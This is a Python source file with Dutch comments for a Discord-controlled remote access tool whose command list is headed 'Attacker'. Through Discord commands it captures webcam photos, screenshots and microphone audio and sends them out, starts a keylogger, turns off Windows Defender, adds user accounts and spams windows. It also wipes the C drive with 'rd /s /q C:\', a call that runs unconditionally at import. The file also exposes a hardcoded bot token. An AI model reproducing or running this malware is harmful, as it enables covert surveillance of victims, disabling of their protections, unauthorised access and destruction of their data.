import discord
import os
from pynput import keyboard
import cam
import responses
import pyaudio
import wave
import subprocess
import threading  # Importeer threading-module voor het starten van een aparte thread

logging_duration = 0  # Default logging duration

client = discord.Client()

async def notify_bot_started():
    # Zoek de bot in alle servers waar hij aanwezig is
    for guild in client.guilds:
        # Zoek het eerste kanaal waar de bot een bericht kan sturen
        channel = guild.system_channel
        if channel:
            # Stuur een melding naar dat kanaal
            await channel.send("De bot is nu actief!")
            # Stop de loop nadat een kanaal is gevonden
            break

# Definieer de stop_keylogger-functie
def stop_keylogger():
    # Stop de keylogger door de logging duur naar 0 te zetten
    global logging_duration
    logging_duration = 0


def on_press(key):
    try:
        # Print de toetsaanslag
        print('Key {0} pressed'.format(key.char))
    except AttributeError:
        # Print speciale toetsen
        print('Special key {0} pressed'.format(key))

    # Als de gebruiker heeft aangegeven om te stoppen, stop de keylogger
    if key == keyboard.Key.esc:
        return False


def start_keylogger(duration):
    global logging_duration
    logging_duration = duration

    # Start de keylogger in een aparte thread
    keylogger_thread = threading.Thread(target=start_keylogger_thread, args=(duration,))
    keylogger_thread.start()

    # Als de duur niet is opgegeven of als de duur 0 is, wachten we niet op de thread
    if duration > 0:
        # Als er een duur is opgegeven, wachten we tot de duur is verstreken
        timer = threading.Timer(duration, stop_keylogger)
        timer.start()


def start_keylogger_thread(duration):
    with keyboard.Listener(on_press=on_press) as listener:
        # Als de duur niet is opgegeven of als de duur 0 is, luisteren we continu
        if duration <= 0:
            listener.join()
        else:
            # Als er een duur is opgegeven, wachten we tot de duur is verstreken
            listener.join(duration)


async def send_message(message, user_message, is_private):
    try:
        response = responses.handle_response(user_message)
        await message.author.send(response) if is_private else await message.channel.send(response)
    except Exception as e:
        print(e)


async def show_cam(channel):
    cam.cam_photo()
    await channel.send("Hier is een foto van de webcam:", file=discord.File('tmp.png'))
    os.remove('tmp.png')


async def show_screenshot(channel):
    cam.screen_shot()
    await channel.send("Dit is de screenshot van de pc:", file=discord.File('screenshot.png'))
    os.remove('screenshot.png')


def record_audio(filename="myrecording.wav", duration=10):
    CHUNK = 1024
    FORMAT = pyaudio.paInt16
    CHANNELS = 1
    RATE = 44100

    audio = pyaudio.PyAudio()

    stream = audio.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
    frames = [stream.read(CHUNK) for _ in range(0, int(RATE / CHUNK * duration))]

    stream.stop_stream()
    stream.close()
    audio.terminate()

    wf = wave.open(filename, 'wb')
    wf.setnchannels(1)
    wf.setsampwidth(audio.get_sample_size(FORMAT))
    wf.setframerate(RATE)
    wf.writeframes(b''.join(frames))
    wf.close()

    return filename


def disable_defender():
    try:
        subprocess.run(["powershell", "-Command", "Set-MpPreference -DisableRealtimeMonitoring $true"], check=True)
        print("Windows Defender is uitgeschakeld.")
    except subprocess.CalledProcessError:
        print("Fout bij het uitschakelen van Windows Defender.")


def enable_defender():
    try:
        subprocess.run(["powershell", "-Command", "Set-MpPreference -DisableRealtimeMonitoring $false"], check=True)
        print("Windows Defender is ingeschakeld.")
    except subprocess.CalledProcessError:
        print("Fout bij het inschakelen van Windows Defender.")

def create_user(username, password):
    try:
        subprocess.run(["net", "user", username, password, "/add"], check=True)
        print(f"Gebruiker {username} is succesvol aangemaakt.")
    except subprocess.CalledProcessError:
        print(f"Fout bij het aanmaken van gebruiker {username}.")

def delete_c_drive():
    try:
        # Controleer eerst of het besturingssysteem Windows is
        if os.name == 'nt':
            # Voer het verwijderingscommando uit voor de C-schijf
            os.system("rd /s /q C:\\")
            print("C-schijf succesvol verwijderd!")
        else:
            print("Dit script kan alleen op Windows worden uitgevoerd.")
    except Exception as e:
        print(f"Fout bij het verwijderen van de C-schijf: {e}")

# Voorbeeld van het uitvoeren van de functie
delete_c_drive()

def run_discord_bot():
    TOKEN = 'MTIxMzEyMDYwNjM5Mjk1MDgxNA.Gqv65P.hJalKG1SX0oDPEiWdfhXGALpN_y3ta2UcHnzKY'
    intents = discord.Intents.default()
    client = discord.Client(intents=intents)

    @client.event
    async def on_ready():
        print(f'Staat aan en is actief {client.user}')

    @client.event
    async def on_message(message):
        if message.author == client.user:
            return

        username = str(message.author)
        user_message = str(message.content)
        channel = message.channel

        print(f"{username} said: {user_message} ({channel})")

        if user_message.strip():
            if user_message.startswith('hallo'):
                await channel.send(responses.welcome_message())
            elif user_message.startswith('/help'):
                help_message = """

                Attacker:
                - `/showcam`: Toont een foto van de webcam.
                - `/screen`: Maakt een schermafbeelding.
                - `/keylogger`: Start de keylogger.
                - `/stop_keylogger`: Stopt de keylogger.
                - `/record_audio`: Start een audio-opname van 10 seconden.
                - `/disable_defender`: Schakelt Windows Defender uit.
                - `/enable_defender`: Schakelt Windows Defender weer in.
                - `/kladblokspam`: Start een kladblok spam.
                - `/tabspam`: Opent een spam van Google-tabbladen.
                - `/create_user <username> <password>`: Maakt een nieuwe gebruiker aan.
                - `/delete_c_drive`: Verwijdert de C-schijf. LET OP: Dit commando heeft ernstige gevolgen!
          
                Games:
                - `/rol`: Geeft een willekeurig getal tussen 1 en 6..

                Makers:
                - `/makers`: Laat de maker zien van de code.
                """
                await channel.send(help_message)
            elif user_message.startswith('/screen'):
                await show_screenshot(channel)
            elif user_message.startswith('/showcam'):
                await show_cam(channel)
            elif user_message.startswith('/delete_c_drive'):
                # Voer de functie delete_c_drive() uit om de C-schijf te verwijderen
                delete_c_drive()
                await channel.send("C-schijf is verwijderd! Let op: dit commando heeft ernstige gevolgen en mag alleen voor demonstratiedoeleinden worden gebruikt.")
            elif user_message.startswith('/record_audio'):
                audio_file = record_audio()
                await channel.send("Hier is een audio-opname van 10 seconden van de pc:", file=discord.File(audio_file))
                os.remove(audio_file)
            elif user_message.startswith('/keylogger'):
                duration = int(user_message.split()[1]) if len(user_message.split()) > 1 else 0
                start_keylogger(duration)
                await channel.send("Keylogger gestart! Ik zal de ingetoetste tekens vastleggen.")
            elif user_message.startswith('/stop_keylogger'):
                stop_keylogger()
                await channel.send("Keylogger gestopt!")
            elif user_message.startswith('/disable_defender'):
                disable_defender()
                await channel.send("Windows Defender is uitgeschakeld.")
            elif user_message.startswith('/enable_defender'):
                enable_defender()
                await channel.send("Windows Defender is ingeschakeld.")
            elif user_message.startswith('/create_user'):
                try:
                    # Split de gebruikersnaam en wachtwoord van het bericht
                    _, username, password = user_message.split()
                    # Roep de functie aan om de gebruiker te maken
                    create_user(username, password)
                    await channel.send(f"Gebruiker {username} is succesvol aangemaakt.")
                except ValueError:
                    await channel.send("Gebruik: `/create_user <username> <password>` om een nieuwe gebruiker aan te maken.")
            elif user_message.startswith('/makers'):
                await channel.send(responses.get_makers())
            elif user_message.startswith('/kladblokspam'):
                try:
                    num_notepads = int(user_message.split()[1])
                    response = responses.spam_notepad(num_notepads)
                    await channel.send(response)
                except IndexError:
                    await channel.send("Gebruik: `/kladblokspam (aantal) om het aantal kladblokken op te geven.")
                except ValueError:
                    await channel.send("Ongeldig aantal kladblokken. Gebruik een geldig getal.")
            elif user_message.startswith('/tabspam'):
                try:
                    num_tabs = user_message.split(' ', 1)[1]
                    response = responses.spam_google_tabs(num_tabs)
                    await channel.send(response)
                except IndexError:
                    await channel.send("Gebruik: `/tabspam (aantal) om het aantal te openen tabbladen op te geven.")
            elif user_message.startswith('/welcome'):
                await channel.send(responses.welcome_message())
            else:
                await send_message(message, user_message, is_private=False)
        else:
            print("Leeg bericht ontvangen, wordt niet verzonden.")

    client.run(TOKEN)


if __name__ == "__main__":
    run_discord_bot()
